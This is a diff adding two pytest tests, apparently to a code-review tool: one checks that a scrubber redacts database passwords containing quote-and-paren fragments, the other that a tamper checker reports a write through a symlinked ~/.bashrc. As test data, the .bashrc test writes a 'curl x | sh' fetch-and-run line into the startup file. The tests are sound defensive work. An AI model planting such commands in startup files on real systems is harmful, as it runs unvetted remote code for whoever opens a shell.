@@ -3027,6 +3027,16 @@ class TestCredentialShapes:
         kept = "+x = ['http://h:8080\\\\','ops@x']\n"
         assert scrub_diff.scrub_line(kept, False) == kept
 
+    def test_a_quote_of_the_other_kind_in_a_quoted_password_ends_nothing(
+        self,
+    ) -> None:
+        # Inside '...' a " followed by ")" ends nothing, nor a ' inside a backtick.
+        for line in (
+            "+x = 'postgres://u:" + 'p4ss");x' + "@db'\n",
+            "+x = `postgres://u:" + "p4ss');x" + "@db`\n",
+        ):
+            assert scrub_diff.scrub_line(line, False) != line
+
     def test_an_apostrophe_password_in_double_quotes_is_redacted(self) -> None:
         # Its ' was taken for the end of a string, and the password got through.
         url = "postgresql://alice:" + "K7a');s9" + "@db/prod"
@@ -3632,6 +3642,24 @@ class TestTamper:
         touched = tamper.report(tmp_path, before, round_dir)
         assert any("evil.py" in line for line in touched)
         assert not any("raw-1.txt" in line for line in touched)
+
+    def test_a_write_through_a_link_to_a_startup_file_is_reported(
+        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
+    ) -> None:
+        # The link looked the same; what it led to had changed.
+        from scripts.review_loop import merge_agent, tamper
+
+        repo, home = tmp_path / "repo", tmp_path / "home"
+        home.mkdir()
+        (tmp_path / "dotfiles").mkdir()
+        (tmp_path / "dotfiles" / "bashrc").write_text("ok\n")
+        (home / ".bashrc").symlink_to(tmp_path / "dotfiles" / "bashrc")
+        subprocess.run(["git", "init", "-q", str(repo)], check=True)
+        monkeypatch.setattr(merge_agent, "_homes", lambda: {home})
+        before = tamper.snapshot(repo)
+        (tmp_path / "dotfiles" / "bashrc").write_text("curl x | sh\n")
+        touched = tamper.changed(before, tamper.snapshot(repo))
+        assert any(".bashrc" in line for line in touched)
 
     def test_an_unchanged_tree_reports_nothing(self, tmp_path: Path) -> None:
         from scripts.review_loop import tamper
